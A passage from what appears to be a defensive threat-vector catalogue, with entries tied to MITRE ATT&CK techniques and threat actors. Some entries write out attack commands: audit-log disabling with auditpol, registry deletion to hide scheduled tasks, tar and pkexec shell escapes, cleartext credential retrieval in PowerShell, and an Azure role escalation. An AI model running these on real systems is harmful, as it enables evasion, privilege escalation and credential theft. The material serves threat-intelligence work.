  systems, including user and group information.
- Zenmap - it's a network discovery and security auditing tool
- SPARTA - tool used in the scanning and enumeration phase of information
  gathering on Linux systems. This tool can be used for network scanning and
  collection of information, for example scan of IP ranges, network and
  domain names ref [4]. 
",1,2025-08-06,2025-08-07,,,,,T1082
dd5d942c-bac4-4000-b9a6-ca4fef6cfb84,Spearphishing Attachment,Threat Vectors,clear,"Spearphishing messages are often crafted using pernicious social engineering
techniques.

In Spearphishing Attachment attacks, recipients receive emails that contain
malicious attachments. The email message entices users to open the
attachment(s) using the knowlege gained.

- displayed sender name is known by the recipient
- topic/subject is in the field of activity of the recipient
- urgency of user action (less relevant TTP for spearphishing emails)

These attachments look like valid files. In some cases, they are disguised
as MS Office, PDF files or CV files ref [5]. It could be that the attacker
manage to capture a legit document, weaponise it and send it to (new)
recipients (it has been observed that such attack can occur within tens of
minutes after the original legit document was released). In addition, there
have also been reports of TAMs sending malicious PowerPoint (PPSX) files
that exploit vulnerabilities and emails with Word document attachments that
do not require macros to be enabled in order to execute.  

Attachments may:

- contain links leading to a page for credential harvesting.
- be weaponized to install malicious software on the computer of the user or
run some actions on the device;
- or open a decoy document. This is quite frequent in attack conducted by TA
when the malware within the attachment makes some check and assess that the
was not opened on the targeted organisation. Decoy document are meant to
evade detection and avoid raising alert or recipient report to cyber
security team, such as emails with attached Word documents that do not
require enabling macros to execute.

## Common techniques to evade detection

Attackers may use several way to try to hide visually the true nature of
the file.

### Double extensions

Attackers may use double extensions to masquerade the true file type to 
trick users into opening files that might seem safe. But this TTP is quite
well addressed at front email gateway (blocking by default file with several
extension, usually also when within a compressed file). 

### Password-protected attachment

Malicious password-protected archive files are designed to deceive users
and bypass commonly deployed inspection engines to deliver malware and 
ransomware down to a user endpoint. If the Email Security tool detects a
password-protected attachment, it will scan the metadata of the file;
not the content.

### Right-to-Left Override (RLTO)

Another technique is to hide the real file extension is Right-to-Left 
Override (RLTO). Windows supports languages that are written from right 
to left using a Unicode character that causes the text that follows it 
to be displayed in reverse, this method is used to blend the real file 
extension with the file name.
",3,2022-03-14,2025-09-23,,,,"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878, [Enterprise] Gamaredon Group, Gamaredon Group, [Mobile] APT28, APT28, [Enterprise] Mustang Panda, RedDelta, [Enterprise] TA505, TA505, RomCom",T1566.001
ca2751c7-8641-4fb0-a90b-30c5987015dc,Externally controlled Azure credentials added to an Enterprise app or its SPN,Threat Vectors,clear,"Threat actors may assign valid azure credentials to an Azure Enterprise App or its SPN (service
principal). NSA writes in its advisory that the app was seen leveraged
to access emails from the Enterprise app, but the attack vector could be
used for many other types of leverage.
",1,2022-11-28,2022-11-28,,,,,T1098.003
9b41d6cf-de4d-44d1-97cc-f3671f4ee5ab,Azure - Public Accessible Resource,Threat Vectors,clear,"In Azure, this technique highlights the risk where certain resources—commonly **Network Interfaces** 
and **Virtual Machines**—have public IP addresses or open ports, making them directly 
reachable from the internet. Unlike other reconnaissance techniques, this isn’t 
just about discovering resource metadata but about identifying resources configured 
(intentionally or not) for public access.

#### How Attackers Use This Vector

- **Discovery Phase:** Attackers or researchers employ automated tools and scan 
internet-facing IP space, hunting for live Azure VMs, network interfaces, and endpoints 
whose public exposure can be confirmed.
- **Enumeration Approaches:** 
  - **Subdomain/Service Pattern Scanning:** Many Azure services use predictable 
  domain structures (e.g., `*.azurewebsites.net`, `*.blob.core.windows.net`). 
  Attackers enumerate these to find exposed resources.
  - **Open Ports Scans:** Tools scan IPs for open RDP, SSH, web, or management ports.
- **Public APIs and Metadata:** Some Azure resource information is available through 
public APIs or unauthenticated metadata services, providing further opportunities 
for adversaries to discover exposed resources.
- **Real-World Tools:** Well-known tools include MicroBurst, AADInternals, and custom 
scripts for mass scanning.
  
#### Specific Azure Resources at Risk

- **Network Interfaces:** Networking components that, if tied to public IPs, may 
expose internal workloads.
- **Virtual Machines:** Especially those configured with public IPs and ports like 
RDP (3389) or SSH (22) open.
- **App Services and Blob Storage:** Though not explicitly listed in AZT103, these 
are also frequent targets for enumeration due to default public endpoints.
- **Databases/Clusters:** Services like Azure Data Explorer or managed databases 
may be misconfigured to allow public ingress.

#### Security Implications

- **Increased Attack Surface:** Exposing resources multiplies the number of direct 
entry points for adversaries.
- **Brute-Force and Vulnerability Exploitation:** Resources with public connectivity 
are subject to constant automated attacks and vulnerability scans.
- **Potential Lateral Movement:** Compromising one public resource can serve as 
a foothold to move deeper into the Azure environment.
",2,2025-07-31,2025-09-04,,,{'support::synergize': ['b1593e0b-1b3b-462d-9ab6-21d1c136469d']},,"T1580, T1046, T1133"
5ea50181-1124-49aa-9d2c-c74103e86fd5,Pass-the-hash on SMB network shares,Threat Vectors,clear,"In a **Pass-the-Hash attack (PtH)**, Attackers may use offensive tools to load 
the NTLM hash and try to connect to SMB network shares that are reachable 
from the attacker device (SMB port is open to the internet - initial access) 
or from a compromised station under attacker's control - lateral movement. 

Crackmapexec is an excellent tool to try to connect to SMB network 
shares using NTLM hash (PtH).  

It scales really well as you can simply point and shoot at a whole 
subnet or list of IP addresses.  

Attacker may obtain read-only access to SMB network shares and could retrieve 
additional information.  

They may get write access to the share and then be able to drop files 
that victims might be enticed to open or to execute.
",2,2023-08-30,2025-10-01,,,{'sequence::succeeds': ['02311e3e-b7b8-4369-9e1e-74c0a844ae0f']},"[Mobile] APT28, APT28, [Enterprise] APT1, APT1, [Enterprise] APT39, APT39, [Enterprise] APT32, APT32, [ICS] APT33, APT33, [Enterprise] Aquatic Panda, Tonto Team, [Enterprise] Blue Mockingbird, [Enterprise] BRONZE BUTLER, Tick, [Enterprise] Cobalt Group, Cobalt, [ICS] FIN6, FIN6, [Enterprise] Fox Kitten, Fox Kitten, [Enterprise] HAFNIUM, HAFNIUM","T1003.001, T1550.002, T1021.002"
23f6a192-a25d-48b8-a235-7bb55e483682,Persistence with Azure Automanage Machine Configuration,Threat Vectors,clear,"Azure Policy enables administrators to define, enforce and remediate
configuration standards on Azure resources and even on non Azure assets
using Azure Arc. One key feature, that was released in 2021, is the
guest configuration feature of Azure Policy. Azure Policy Guest 
Configuration is now called Azure Automanage Machine Configuration. 

Adversaries may use this functionality to gain persistence in an Azure 
environment if they have gained the necessary permissions within the 
subscription. And since Azure VMs are in many cases directly integrated 
in the on-Premises Active Directory it is possible to gain additional 
access there.
",2,2022-04-28,2023-01-06,,,,,T1484.001
36694031-a3d8-474e-b0e6-f44ba94c2a22,Change the audit policy to disable Windows event logging,Threat Vectors,clear,"A threat actor may change an audit policy setting with the purpose of
disabling Event logging for specific entries. Usually the threat actor will
disable specific audit policy entries, but other scenarios can be imagined.

For example, they can change the audit policy settings manually, with
PowerShell or other scripts, through the registries or by using
Command-line interface.

Examples: 

Command-prompt (cmd) interface:

auditpol /set /category:""Account Logon"" /success:disable /failure:disable

Where /success or /failure are parameters used for disabling of successful
or failed events.

auditpol /Set /Category:* /success:disable

Where the parameter /Category is used to delete only specific category, set of
categories or all of them as shown in the example with wildcard (*) character.

auditpol /clear /y
auditpol /remove /allusers

The both commands are used to clear the audit policy settings

PowerShell commands to modify Audit policies:

auditpol /get /category:*
or auditpol /list/category
PS ~> $AuditPolicyReader::GetClassicAuditPolicy()

Example for a PowerShell script that change the audit policy to audit
successful logon events on the local computer. A threat actor can modify
the $GPO and $SecuritySettingsPath variables to target a different GPO or
security setting, also can modify $AuditSettingName and $AuditSettingValue
variables to change the audit policy to a different setting or value.

Import-Module GroupPolicy
$GPO = ""LocalGPO""
$SecuritySettingsPath = ""Computer Configuration\Windows Settings\Security Settings""
$AuditSettingName = ""Audit Logon Events""

# Set the value for the security setting.
# The values are:
# 0 = Success and Failure
# 1 = Success
# 2 = Failure

$AuditSettingValue = 1
$SecuritySettings = Get-GPRegistryValue -Name $GPO -Key $SecuritySettingsPath | Select-Object -ExpandProperty Values
$AuditSetting = $SecuritySettings | Where-Object { $_.Name -eq $AuditSettingName }
$AuditSetting.Value = $AuditSettingValue
Set-GPRegistryValue -Name $GPO -Key $SecuritySettingsPath -Value $SecuritySettings
gpupdate /force


For advanced policies, threat actors can use /r to get a csv-formatted table:

auditpol /get /category:'Account Logon' /r | ConvertFrom-Csv | 
Format-Table 'Policy Target',Subcategory,'Inclusion Setting'

Manual change: 

If the service secpol.msc is running, then a threat actor can navigate to
Security Settings\Local Policies\Audit Policy to modify the basic policy
settings or navigate to Security Settings\Advanced Audit Policy
Configuration to modify advanced policy settings.
",3,2023-01-05,2023-01-06,,,,"[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy, [Enterprise] Threat Group-3390, APT27",T1562.002
682bf600-ec3e-4780-9f8f-8305ac602bef,Change file owner to a privileged account,Threat Vectors,clear,"Adversaries seeking to gain or maintain elevated privileges often target the 
ownership and permissions of critical files or directories. By changing a 
file’s owner to a privileged account (e.g., SYSTEM on Windows, `root` on Linux, 
or `root:wheel` on macOS), threat actors ensure that their malicious tools, 
binaries, or configuration files inherit elevated trust levels. 
This manipulation can facilitate various malicious objectives, including 
executing code with higher privileges, bypassing security controls, 
and evading detection.  

### Windows

Attackers may use built-in utilities such as `takeown.exe` or `icacls.exe` 
to change ownership and grant Full Control permissions to a high-privilege 
user or group.  

For instance:  
```powershell
takeown.exe /f C:\sensitive_data.txt
icacls.exe C:\sensitive_data.txt /setowner Administrator
icacls.exe C:\sensitive_data.txt /grant Administrator:F
```

By doing so, they can ensure that subsequent manipulations of these files, 
including the addition of backdoors, data exfiltration tools, 
or credential-stealing binaries, are executed under a privileged context.  

### Linux and macOS

Threat actors mainly rely on the `chown` command to modify file ownership. 
But other commands may achieve the same objective like chgrp or setfacl 

For example:
```bash
sudo chown root:root /usr/local/bin/malicious_script
```

Once a file is owned by `root`, it can be paired with setuid bits 
or extended attributes, enabling the file to run with elevated privileges. 
",1,2024-12-13,2024-12-13,,,,"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878",T1222
d2ca077d-6ec6-4442-bdc5-b1822e9f4ae8,Deletion of Tasks or Tree registry keys in scheduled task hives,Threat Vectors,clear,"Threat actors are using deletion of tree registry keys to remove
information related to their activities, for example created previously
scheduled tasks. For the deletion of tree registry keys, the threat actors
are using reg command in command-line utility with a parameter delete,
PowerShell commands or scripts or manually delete the registry keys from
Registry Editor (regedit). In Azure cloud infrastructure threat actors use
Azure CloudShell to delete registry keys.

Example for registry keys created upon creation of a new scheduled task:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}

The registy keys above can be deleted using the ""reg delete"" command. The 
""reg delete"" command deletes the specified registry key and all of its 
subkeys.

reg delete ""HKEY_LOCAL_MACHINE\Registry_Key"" /f

Examples for deleting registry keys with PowerShell commands:

Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME -Force -Verbose

or

Get-Item Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME | Remove-Item -Force -Verbose

Where Get-Item command retrieves the Key name and then Remove-Item uses the
result from Get and deletes the key registry.

To delete registry keys using Azure CloudShell threat actors are using
Remove-ItemProperty cmdlet in Windows PowerShell or the rm command in Bash.

Examples:

Remove-ItemProperty -Path ""HKLM:\Software\MyKey"" -Name ""MyValue""

rm ""HKLM:\Software\MyKey""
",4,2022-12-19,2022-12-20,,,,"[Enterprise] HAFNIUM, HAFNIUM","T1053.005, T1564"
5e66f826-4c4b-4357-b9c5-2f40da207f34,Scheduled tasks to maintain persistence in registry,Threat Vectors,clear,"A threat actor can successfully maintain persistence on a compromised system 
by using scheduled tasks to create or edit registry entries.

Windows Scheduled Task is a feature of the Windows operating system that 
allows users to schedule a command or program to run automatically at a 
specific time or interval. This can be useful for running tasks that need to
be performed regularly, such as backing up files or checking for updates. 
Scheduled tasks can be configured to run in the background, without the need
for user intervention.

One example for a scheduled task that establish persistence in the registry 
is a task that is configured to run when specific condition is met - as 
example on system start up. The task will have an action configured, which 
might be to download and run a payload, which for example could be a payload
that sets a registry run key. Registry run keys are keys in the Windows 
registry that are called during system start up. These keys enable 
configurations to be loaded automatically. Registry run keys can also 
directly execute binary files on system start up. 

To create a scheduled task that runs at system startup attackers are using 
for example Windows Task Scheduler, cmd.exe or PowerShell commands in a 
script. Once the task has been created, it will be added to the registry and 
will run automatically every time the system starts up, or until discovered 
and deleted.

**Examples for mechanism of persistence in the registries**

 - Run/RunOnce Keys: Malware can add entries to the registry keys
 (or their RunOnce counterparts) to execute every time the system
 boots or a user logs in. An example for such Reg keys:
 
 ` HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run `
 
 or 
 
 ` HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run `
 
 
 - Scheduled Tasks: Utilizing the Task Scheduler, malware can create
 tasks that run at specific intervals or times, ensuring persistence.
 These tasks are often registered in the registry under
 
 ` HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache `.

 - Windows Services: Malicious services can be installed and configured
 to start automatically upon system boot. These are typically registered
 under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services`.

### Additional persistence techniques

Other common techniques used by malware in general include:

- **Modifying Registry Keys**: Malware often alters specific registry keys 
(like those in `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) 
to ensure they are executed at startup.

- **Modifying Registry Keys**: The following enables the malware to run for all 
users on the system: (HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run)

- **Using Startup Folders**: Malware can place executable files in startup
folders so that they run automatically when a user logs into their account.   
",6,2022-12-14,2025-06-11,,,{'sequence::succeeds': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']},"[Enterprise] HAFNIUM, HAFNIUM, [Enterprise] Fox Kitten, Fox Kitten, [Enterprise] APT29, UNC2452","T1053.005, T1112"
c7e260d8-d391-41eb-be1a-7f276c99b383,Azure app registration - privilege escalation,Threat Vectors,clear,"Azure app registration privilege escalation is a significant threat vector where 
attackers exploit misconfigured or compromised application registrations to gain 
elevated access in Azure environments. This occurs when attackers leverage excessive 
permissions associated with service principals or app registrations to bypass role-based 
access controls (RBAC).

### Key Attack Vectors  
**1. Service Principal Ownership Abuse**  
Owners of Azure applications can modify service principal permissions. For example, 
a user with **Reader** role but ownership of an application could execute commands like:  
```bash
az role assignment create --assignee ""[email protected]"" --role ""Owner"" --scope ""/subscriptions/Production""
```
This grants **Owner** privileges, enabling resource creation/deletion and further 
role assignments.  

**2. Dangerous API Permissions**  
App registrations with high-privilege Microsoft Graph API permissions pose critical risks:  
- **AppRoleAssignment.ReadWrite.All**: Allows granting admin consent and assigning 
roles like **RoleManagement.ReadWrite.Directory** (enables Global Admin escalation).  
- **Directory.ReadWrite.All**: Permits modifying Azure AD group memberships.  
- **User.ReadWrite.All**: Enables password resets and profile modifications.  

**3. Phishing-Driven Attacks**  
Attackers with a compromised standard user account can:  
1. Register an app with ""Accounts in any organizational directory"" and phishing redirect URIs.  
2. Configure high-risk Graph API permissions (e.g., *Mail.Read*, *User.Read.All*).  
3. Send phishing links to victims, capturing access tokens via a malicious OAuth server.  

### Exploitation Workflow  
- **Step 1**: Compromise a low-privileged account.  
- **Step 2**: Create or modify an app registration to include dangerous permissions.  
- **Step 3**: Use the app’s client ID/secret to authenticate and execute privileged 
operations (e.g., adding users to admin groups).  
- **Step 4**: Escalate to **Global Admin** via *RoleManagement.ReadWrite.Directory*.  
",3,2025-05-23,2025-09-08,,,"{'support::enabled': ['bb2501d5-99c7-44a6-ac5a-9510102d6611', '2743bf18-3b86-4721-bf3e-153dcda0b149', 'fe6827f2-efb4-43b3-9ca3-b7d417111b32']}",,"T1098, T1068"
e2b93649-44d7-4007-9592-3baf79cd2b33,Deletion of Security Descriptor (SD) value in registry for scheduled task,Threat Vectors,clear,"A Security Descriptor (SD) is a data structure that specifies the security
attributes of an object in Windows operating system. These attributes
include the permissions and access rights granted to users and groups, as
well as any security measures that have been applied to the object.

Security Descriptor determines the users allowed to run specific task. If
the SD value is deleted within the registry tree path, this deletion
results in “disappearing” of the task from “schtasks /query” and Task
Scheduler.

Some malware families, for example Tarrask malware can use security
descriptors to create scheduled tasks that are hidden from the user and are
not visible in the Windows Task Scheduler. These tasks are used to execute
the malware's malicious payload, which can include installing additional
malware, stealing sensitive information, or disrupting the normal operation
of the infected system.

To evade detection, a malware modifies the security descriptor of the
scheduled task to grant only the SYSTEM account access to the task. This
means that other users and security tools will not be able to see or
interact with the task, making it more difficult to detect and remove.

Security professionals can use tools such as Sysinternals Autoruns and
Process Explorer to identify and remove these hidden scheduled tasks, as
well as other forms of malware that use security descriptors for defense
evasion.
",2,2022-12-16,2022-12-19,,,,"[Enterprise] HAFNIUM, HAFNIUM",T1053.005
41f57a57-1ed6-407e-bb70-a0f6ab52af10,Azure - Storage Blobs Reconnaissance,Threat Vectors,clear,"Reconnaissance targeting Azure Storage Blobs involves gathering intelligence to identify
exposed storage accounts, containers, and blobs-often without authentication or detection.
Azure’s predictable URL structure, common naming conventions, and potential for
misconfiguration make it a prime target for such activities.

### Discovery of Storage Accounts

- **DNS and Subdomain Enumeration:**  
Each Azure Storage account is accessible via a unique subdomain
(e.g., `yourstorageaccount.blob.core.windows.net`).   
Attackers use DNS enumeration tools (like `dnscan`) and wordlists to guess or 
discover valid storage account names. They often use company names, abbreviations, 
or product names as starting points.

- **Search Engine Dorking:**  
Publicly accessible blobs and containers may be indexed by search engines. Attackers 
leverage advanced search queries (Google dorking), such as `site:*.blob.core.windows.net`, 
to find open blob storage accounts and even specific file types (e.g., `.csv`, `.xlsx`) 
or keywords like `""password""`.

### Enumeration of Containers and Blobs

- **URL Pattern Guessing:**  
Azure Blob Storage uses predictable URL patterns for containers and blobs. Attackers 
automate requests to likely container names (e.g., `backups`, `images`, `prod`) 
and blob names, increasing the odds of finding exposed data.

- **Automated Scanning Tools:**  
Tools like MicroBurst, goblob, and custom scripts are used to automate the enumeration 
of storage accounts, containers, and blobs. These tools can quickly test thousands 
of possible names, scaling up the reconnaissance process.

- **Custom Wordlists:**  
Attackers may build custom dictionaries based on the target’s business, products, 
or previously leaked information to improve the accuracy of their enumeration efforts.

### Analysis of Exposed Data and Metadata

- **Monitoring Access Patterns:**  
By analyzing metadata (timestamps, blob sizes, file types), attackers can infer 
which blobs or containers are most likely to contain sensitive or valuable information.

- **Chaining Exposures:**  
If attackers find an exposed blob, they may discover references within the files 
themselves (e.g., database connection strings, links to other storage accounts), 
allowing them to recursively enumerate and compromise further resources.

### Tenant and Service Enumeration

- **Azure Tenant Discovery:**  
Attackers can leverage known company domains or public APIs to enumerate Azure tenants 
and services, including blob storage endpoints. Tools like MicroBurst and AADInternals 
automate the discovery of tenant IDs and service endpoints, providing additional 
reconnaissance data.

### Reconnaissance Characteristics

- **Silent and Non-Intrusive:**  
Most reconnaissance activities are passive and do not require authentication, making 
them difficult to detect until exploitation occurs.

- **Scalable and Automated:**  
Attackers can automate the entire process, rapidly scanning large numbers of potential 
storage accounts and containers.

### Real-World Impact

- **Sensitive Data Exposure:**  
Even a single misconfigured blob can expose sensitive data, credentials, or internal 
documentation, which can be leveraged for further attacks.

- **Pivoting and Lateral Movement:**  
Exposed blobs may contain information that allows attackers to pivot to other services 
or escalate their access within the target environment.
",3,2025-05-07,2025-09-08,,,"{'support::enabled': ['53f4e2f0-7d11-4629-bb26-905993a589db', '2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1530, T1552, T1619, T1567, T1190"
025c73c6-f1a6-4382-a64f-38cfe81f8dc6,Container privilege escalation via kernel or container runtime exploit,Threat Vectors,clear,"Vulnerabilities in container runtime (Docker, containerd, etc.) or kernel 
(Linux or Windows) can be exploited by a threat actor with execution 
ability to jump out from container to host system and gain 
root/administrator privileges depending on vulnerability type. 
",2,2022-09-15,2022-12-21,,,,"[Enterprise] APT29, UNC2452, [Enterprise] APT32, APT32, [ICS] APT33, APT33, [Enterprise] Cobalt Group, Cobalt, [Enterprise] Tonto Team, Tonto Team, [Enterprise] Turla, Turla, [Enterprise] Whitefly, Whitefly, [Mobile] APT28, APT28, [ICS] FIN6, FIN6, [Enterprise] Threat Group-3390, APT27, [Enterprise] TeamTNT, TeamTNT","T1068, T1611"
f8876b38-ed54-495f-bd40-758211b9d6ee,Apple WebKit exploited for arbitrary code execution,Threat Vectors,clear,"WebKit is a cross-platform browser rendering engine used in Safari
and other applications across macOS, iOS, and other platforms.

Due to Apple's restrictions, even Chromium-based browsers on iOS,
such as Google Chrome and Microsoft Edge, rely on WebKit, making
them vulnerable to this exploit as well. According to Apple,
this issue may have been exploited against specific targeted
individuals on versions of iOS before iOS 17.23 ref [2].    

The WebKit vulnerability (CVE-2025-24201) is an out-of-bounds write 
vulnerability and Apple notes it as a zero-day exploited remotely. 
It allows attackers to bypass WebKit's sandbox and achieve arbitrary 
code execution on affected devices. The vulnerability requires user
interaction in order to be triggered. For more details ref [6].        

The vulnerability requires user interaction in order to be triggered.
From the analysis and the information in the reports what is known until
now is that the exploit code is not publicly available and the Webkit
component presents in software used by multiple Union entities.   

From the available information until now, the known affected
products are chromium-based browsers on the following platforms: 
macOS, iOS, iPadOS ref [1], [2].  

Apple is also known for emailing affected users, despite the 
limited amount of information on the Threat Alert, as confirmed by 
CERT-EU, in case of exploitation detected by Apple notification 
will be sent.    
",1,2025-03-18,2025-03-26,,,,,"T1588.006, T1588.005"
fe6827f2-efb4-43b3-9ca3-b7d417111b32,Azure - Gather Application Information,Threat Vectors,clear,"This technique involves adversaries collecting data about applications running within Azure, 
especially those registered in Azure Active Directory (Azure AD). The goal is to 
gain insight into application properties, configurations, exposed endpoints, permission 
scopes, and connections, in order to identify potential attack paths or vulnerabilities.

### Example Attack Scenario

An adversary, during an initial reconnaissance campaign, uses publicly accessible 
APIs and Azure Active Directory (AAD) enumeration techniques to gather information 
about applications registered within the target's Azure tenant. By leveraging permissions 
such as `microsoft.directory/applications/*/read`, the attacker can identify applications, 
service principals, their permissions, owners, secrets, and roles. For instance, 
an attacker using a compromised regular user account attempts to list all AAD applications 
and their configurations. They extract details on app registration, API permissions, 
and whether any apps have high privilege assignments, such as access to sensitive 
data or elevated directory permissions. This information is used to map potential 
targets for privilege escalation or lateral movement.

### Attack Goals and Impact

- **Goals:**
  - Identify high-value applications and their associated service principals.
  - Determine application permissions and trust relationships within AAD.
  - Uncover misconfigurations, excessive privileges, or applications with weak security 
  controls.
  - Establish a list of applications for further exploitation, such as app impersonation, 
  secret harvesting, or abuse of delegated permissions.

- **Impact:**
  - Facilitates subsequent privilege escalation or lateral attacks if vulnerable 
  apps/service principals are identified.
  - May allow attackers to target apps for unauthorized access to sensitive information 
  or execution of high-impact operations.
  - Lays the groundwork for consent phishing attacks or abuse of poorly secured 
  app registrations.
  - Increases the risk of data exposure, unauthorized resource manipulation, and 
  tenant-wide compromises if attackers pivot successfully.

### Attack Flow and Methodology

1. **Data Gathering:**
  - Executes read operations using permissions like `microsoft.directory/applications/*/read` 
  to pull application names, identifiers, associated owners, API permissions, and 
  role assignments.
  - Enumerates app secrets/certificates and checks for possible excessive API scopes, 
  such as Application.ReadWrite.All or RoleManagement.ReadWrite.Directory.

2. **Analysis of Privilege Assignments:**
  - Evaluates permissions and assignments to locate applications with elevated 
  rights or direct access to critical resources.
  - Identifies owners who may be targeted for account compromise or further social 
  engineering.

3. **Planning Further Attacks:**
  - Maps application interrelationships and privilege chains to design next-phase 
  attacks, such as credential theft, application takeover, or phishing consent requests.
  - Assesses whether any applications are misconfigured, exposing endpoints or 
  secrets unintentionally.

4. **Use of Discovered Data:**
  - Uses harvested application data to target privilege escalation (e.g., adding 
  new credentials to an app as seen in advanced API permission abuse scenarios).
  - May initiate attacks such as impersonation using app secrets or deploying malicious 
  applications with elevated permissions.
",2,2025-08-18,2025-09-08,,,"{'support::enabled': ['140907eb-c9fb-4330-9d71-656422388b2b', '53063205-4404-4e6d-a2f5-d566c6085d96'], 'support::enabling': ['ca2751c7-8641-4fb0-a90b-30c5987015dc', 'c7e260d8-d391-41eb-be1a-7f276c99b383']}","Volt Typhoon, Kimsuky, Sandworm, [Enterprise] Star Blizzard","T1078.004, T1110, T1555"
422098a7-567e-47fe-9e92-9fd3ec6df768,Adversary abuses sudo elevation control mechanism,Threat Vectors,clear,"Sudo is a command-line utility for Unix and Linux-based systems that can
provide an effective way to give specific user permissions to run root
(most powerful) level commands on the system. Unfortunately, some
misconfigurations in sudo functionality can allow threat actors to escalate
their privileges to root access.

If the file /etc/sudoers (used to store all sudo privileges) is modified
this can grant to the attacker elevation of privileges. Attackers may use
custom parameters with sudo to edit the sudoers file. For example -f or -l
can be used to edit this file or list which commands or binaries the
current user has access to run.

GTFOBins is a list of Unix binaries which is used by the threat actors to
bypass local security restrictions in misconfigured systems. GTFOBins
allows to search for binaries or commands whether they are executed as sudo
and if they provide access to normally restricted actions. The repo list
contains 300+ commands that could be abused for different purposes if not
configured using this filter. The current list is an open collaborative
project. Link: https://gtfobins.github.io/#+sudo

Examples: 

A ""tar"" option can be exploited to write to arbitrary files (works only for
GNU tar). If write data to files, it may be used for privileged writes on
the files ouside a restricted file system. A ""tar"" command can break out
from restricted environments, using spawn of an interactive system shell.

Reference: https://gtfobins.github.io/gtfobins/tar/

tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

For GNU tar:
tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'

or (for GNU tar when limited command argument injection is available)

TF=$(mktemp)
echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*

The pkexec command can be exploited to gain a root shell and to access the
file system, escalate or maintain privilege access. 

Reference: https://gtfobins.github.io/gtfobins/pkexec/

sudo pkexec /bin/sh
",3,2022-10-27,2022-12-21,,,,,T1548
e3d7cb59-7aca-4c3d-b488-48c785930b6d,PowerShell usage for credential manipulation,Threat Vectors,clear,"Threat actors are using different methods to manipulate user's credentials.
One example of credential manipulation is by using PowerShell commands or
scripts. For example, PowerShell cmdlets or custom section of script can be
used to gather credentials from Windows Credential Manager or other
credentials stores in the system.

Example for access Windows Credential Manager credentials with PowerShell:

Install-Module CredentialManager -force
New-StoredCredential -Target $url -Username $ENV:Username -Pass <parameter>
Get-StoredCredential -Target <target>

Or threat actors can use ready PowerShell module for Credential Manager:

PS> Save-Module -Name CredentialManager -Path
PS> Install-Module -Name CredentialManager -RequiredVersion <the_version>

Example for Get-Credential cmdlet. This is a PS command which prompts a
user for his username and password, and then stores those credentials in a
$Cred variable. The stored credentials are then passed to the Get-WmiObject
cmdlet as the -Credential parameter, allowing the script to connect to the
specified remote computer using those credentials.

Example: 

$Cred = Get-Credential
Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -Credential $Cred

With a Credential parameter threat actors can pass the $credential variable
to other different commands.

Example:

PS> $credential.UserName
root

GetNetworkCredential() method is used to obtain the user's passwords.
A threat actor can append a ""Password"" property in the end of
GetNetworkCredential() method to display the passwords in cleartext.

Example:

PS> $credential.GetNetworkCredential()

UserName Domain
-------- ------
root

PS51> $credential.GetNetworkCredential().Password
<password_in_clear_text>
",3,2023-01-27,2023-01-27,,,,"[Enterprise] APT29, UNC2452, [Mobile] APT28, APT28, [Enterprise] Chimera, [ICS] Wizard Spider, UNC1878, [ICS] FIN6, FIN6, [ICS] FIN7, FIN7, [Enterprise] APT32, APT32, [Enterprise] APT37, APT37","T1098.001, T1059.001"
b6887f4b-eeae-462c-a2ac-7454efb5eabc,Legitimate software dependency injected with malicious code,Threat Vectors,clear,"Legitimate software dependency injected with malicious code refers
to a type of attack where an adversary compromises a legitimate software
dependency, such as a library or framework, by injecting malicious code
into it.  

The compromise of a legitimate package may occur when an attacker
manipulates trusted open-source components by injecting malicious payload.
This is achieved through variety of methods, for example, hijacking the
credentials of project maintainers or exploiting weaknesses in distribution
platforms. Since organizations and developers rely heavily on open-source
software, a compromised package can lead to malicious code being executed
on end-user systems or within the software development pipeline itself
ref [1].    

### Examples for use cases

- An adversary compromises a popular open-source library by injecting
malicious code into it. Examples for open-source libraries could be: NPM
packages, JavaScript frameworks - React, Angular, Vue.js, PyPI packages, 
Python frameworks, Java libraries, Git repositories and others ref [2].
When a developer uses this library in their software, the malicious code
is executed, allowing the adversary to gain unauthorized access.  
- A software vendor's build-in process is compromised, allowing an
adversary to inject malicious code into the software's dependencies.
When the software is installed and run, the malicious code is executed,
compromising the user's system.    
### Possible malicious software infection methods
For more information review ref [3]
- Typosquatting - The threat actor uses subtle typographical errors in
the malicious package name to resemble a popular package, often going
unnoticed by the victim. These packages are usually registered in
repositories such as NPM and PyPI. As prevention of this attack method,
some developers register names that resemble the legitimate site,
precluding the typosquatter's opportunities.
- Masquerading - This attack method completely duplicates the code and
the metadata of a known package, and a snippet of malicious code is added,
thereby creating a Trojan package. Unlike the typosquatting method, this
method uses the exact name of a legitimate package to deceive developers
through similarity.
- Dependency confusion - Dependency is a piece of software required for
a particular program to function. Software dependencies can be either
internal or external. In this technique, the threat actor employs a
valid name of an internal package for the malicious package and publishes
the malicious package on a public repository with a higher version number.
Since default package managers tend to prioritize higher version numbers,
this practice increases the vulnerability to malicious package attacks.
- Dependency hijacking - In this method, the threat actor compromises
